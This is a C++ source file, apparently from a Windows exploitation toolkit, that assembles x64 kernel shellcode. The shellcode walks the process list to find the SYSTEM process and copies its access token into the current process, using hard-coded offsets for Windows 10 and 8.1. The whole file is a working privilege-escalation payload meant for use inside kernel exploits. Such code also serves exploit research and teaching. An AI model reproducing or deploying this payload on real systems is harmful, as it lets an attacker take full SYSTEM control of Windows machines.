#include "kernel.h"

#include "asm.h"


namespace pwn::kernel::shellcode
{
	namespace
	{
		std::vector<BYTE> __steal_system_token_x64(void)
		{

#ifdef __WIN10__
#define KIINITIAL_THREAD  0x0188
#define EPROCESS_OFFSET   0x00b8
#define PROCESSID_OFFSET  0x02e0
#define FLINK_OFFSET      0x02e8
#define TOKEN_OFFSET      0x0358
#define SYSTEM_PID        4

#elif defined(__WIN81__)
#define KIINITIAL_THREAD  0x0188
#define EPROCESS_OFFSET   0x00b8
#define PROCESSID_OFFSET  0x02e0
#define FLINK_OFFSET      0x02e8
#define TOKEN_OFFSET      0x0348
#define SYSTEM_PID        0x4
#endif

			const char* sc = ""
				"push rax ;"
				"push rbx ;"
				"push rcx ;"
				"mov rax, gs:[" STR(KIINITIAL_THREAD) "] ;"
				"mov rax, [rax+" STR(EPROCESS_OFFSET) "] ;"
				"mov rbx, rax ;"
				"mov rbx, [rbx+" STR(FLINK_OFFSET) "] ;"
				"__loop: "
				"sub rbx, " STR(FLINK_OFFSET) " ;"
				"mov rcx, [rbx+" STR(PROCESSID_OFFSET) "] ;"
				"cmp rcx, " STR(SYSTEM_PID) " ;"
				"jnz __loop ;"
				"mov rcx, [rbx + " STR(TOKEN_OFFSET) "] ;"
				"and cl, 0xf0 ;"
				"mov [rax + " STR(TOKEN_OFFSET) "], rcx ;"
				"pop rcx ;"
				"pop rbx ;"
				"pop rax ;"
				"add rsp, 0x28 ;"
				"xor rax, rax ;"
				"ret ;";
			const size_t sclen = ::strlen(sc);
			std::vector<BYTE> out;
			if (!pwn::assm::x64(sc, sclen, out))
				err(L"failed to compile shellcode\n");
			return out;
		}
	}


	std::vector<BYTE> steal_system_token(void)
	{
#ifdef __x86_64__
		return __steal_system_token_x64();
#endif
	}
}